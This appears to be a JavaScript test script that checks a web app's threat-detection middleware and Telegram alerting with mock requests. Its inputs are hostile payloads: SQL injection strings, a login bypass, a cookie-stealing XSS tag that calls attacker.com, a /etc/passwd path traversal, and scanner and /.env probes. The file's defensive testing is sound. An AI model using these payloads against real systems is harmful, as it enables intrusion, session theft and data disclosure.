// ==============================================================================
// ScienceKH — In-Process Threat Detection & Telegram Security Alert Audit
// Runs inside standard sandboxed environment without requiring socket binding
// ==============================================================================

import { threatDetector } from "../server/dist/middleware/threat-detector.js";
import { telegramAlertService } from "../server/dist/services/telegram-alert.service.js";

function createMockResponse() {
  const res = {
    statusCode: 200,
    headersSent: false,
    body: null,
    status(code) {
      res.statusCode = code;
      return res;
    },
    json(data) {
      res.body = data;
      return res;
    },
    setHeader() {},
  };
  return res;
}

async function runInProcessAudit() {
  console.log("======================================================================");
  console.log("🛡️  ScienceKH Security & Threat Detection In-Process Audit");
  console.log("======================================================================\n");

  let passed = 0;
  let failed = 0;

  function report(name, condition, extra = "") {
    if (condition) {
      console.log(`✅ [PASS] ${name} ${extra}`);
      passed++;
    } else {
      console.error(`❌ [FAIL] ${name} ${extra}`);
      failed++;
    }
  }

  // 1. Clean Request Test (Should call next() and remain HTTP 200)
  {
    let nextCalled = false;
    const req = {
      ip: "127.0.0.1",
      headers: { "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" },
      originalUrl: "/api/curriculum?grade=12&subject=chemistry",
      query: { grade: "12", subject: "chemistry" },
      body: {},
      method: "GET",
      socket: {},
    };
    const res = createMockResponse();

    threatDetector(req, res, () => {
      nextCalled = true;
    });

    report("Clean Baseline Request Passes", nextCalled && res.statusCode === 200);
  }

  // 2. SQL Injection Attack: UNION SELECT in Query
  {
    let nextCalled = false;
    const req = {
      ip: "192.168.1.100",
      headers: { "user-agent": "Mozilla/5.0" },
      originalUrl: "/api/curriculum",
      query: { search: "test' UNION SELECT 1,2,3,password FROM users--" },
      body: {},
      method: "GET",
      socket: {},
    };
    const res = createMockResponse();

    threatDetector(req, res, () => {
      nextCalled = true;
    });

    report(
      "SQLi UNION SELECT Blocked",
      !nextCalled && res.statusCode === 403 && res.body?.error === "SecurityViolation",
      `(HTTP ${res.statusCode}, Incident ID: ${res.body?.incidentId || "N/A"})`
    );
  }

  // 3. SQL Injection Attack: Boolean Bypass (OR 1=1) in Request Body
  {
    let nextCalled = false;
    const req = {
      ip: "10.0.0.5",
      headers: { "user-agent": "Mozilla/5.0" },
      originalUrl: "/api/auth/login",
      query: {},
      body: { email: "admin' OR 1=1--", password: "pwd" },
      method: "POST",
      socket: {},
    };
    const res = createMockResponse();

    threatDetector(req, res, () => {
      nextCalled = true;
    });

    report(
      "SQLi Boolean Bypass Blocked in Body",
      !nextCalled && res.statusCode === 403 && res.body?.error === "SecurityViolation",
      `(HTTP ${res.statusCode})`
    );
  }

  // 4. Cross-Site Scripting (XSS): <script> tag in Body
  {
    let nextCalled = false;
    const req = {
      ip: "10.0.0.6",
      headers: { "user-agent": "Mozilla/5.0" },
      originalUrl: "/api/tutor/chat",
      query: {},
      body: { message: "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>" },
      method: "POST",
      socket: {},
    };
    const res = createMockResponse();

    threatDetector(req, res, () => {
      nextCalled = true;
    });

    report(
      "XSS Script Tag Blocked",
      !nextCalled && res.statusCode === 403 && res.body?.error === "SecurityViolation",
      `(HTTP ${res.statusCode})`
    );
  }

  // 5. Path Traversal & Sensitive File Read: ../../etc/passwd
  {
    let nextCalled = false;
    const req = {
      ip: "10.0.0.7",
      headers: { "user-agent": "Mozilla/5.0" },
      originalUrl: "/api/files?path=../../../../etc/passwd",
      query: { path: "../../../../etc/passwd" },
      body: {},
      method: "GET",
      socket: {},
    };
    const res = createMockResponse();

    threatDetector(req, res, () => {
      nextCalled = true;
    });

    report(
      "Path Traversal Blocked",
      !nextCalled && res.statusCode === 403,
      `(HTTP ${res.statusCode})`
    );
  }

  // 6. Automated Scanner Probe: sqlmap in User-Agent
  {
    let nextCalled = false;
    const req = {
      ip: "10.0.0.8",
      headers: { "user-agent": "sqlmap/1.7.2#stable (https://sqlmap.org)" },
      originalUrl: "/api/curriculum",
      query: {},
      body: {},
      method: "GET",
      socket: {},
    };
    const res = createMockResponse();

    threatDetector(req, res, () => {
      nextCalled = true;
    });

    report(
      "Scanner User-Agent (sqlmap) Blocked",
      !nextCalled && res.statusCode === 403 && res.body?.error === "Forbidden",
      `(HTTP ${res.statusCode}, Incident ID: ${res.body?.incidentId || "N/A"})`
    );
  }

  // 7. Sensitive File Reconnaissance Probe: /.env or /wp-admin
  {
    let nextCalled = false;
    const req = {
      ip: "10.0.0.9",
      headers: { "user-agent": "Mozilla/5.0" },
      originalUrl: "/.env",
      query: {},
      body: {},
      method: "GET",
      socket: {},
    };
    const res = createMockResponse();

    threatDetector(req, res, () => {
      nextCalled = true;
    });

    report(
      "Honeypot /.env Probe Blocked",
      !nextCalled && res.statusCode === 403,
      `(HTTP ${res.statusCode})`
    );
  }

  // 8. Telegram Alert Service Formatting & Test Mode Check
  {
    const testResult = await telegramAlertService.testAlert();
    report(
      "Telegram Alert Service Test (Returns informative status without crashing)",
      typeof testResult.success === "boolean" && typeof testResult.message === "string",
      `(${testResult.message})`
    );
  }

  console.log("\n======================================================================");
  console.log(`🎯 Audit Results: ${passed} Passed | ${failed} Failed`);
  console.log("======================================================================\n");

  if (failed > 0) {
    process.exit(1);
  }
}

runInProcessAudit().catch((err) => {
  console.error("Test execution failed:", err);
  process.exit(1);
});
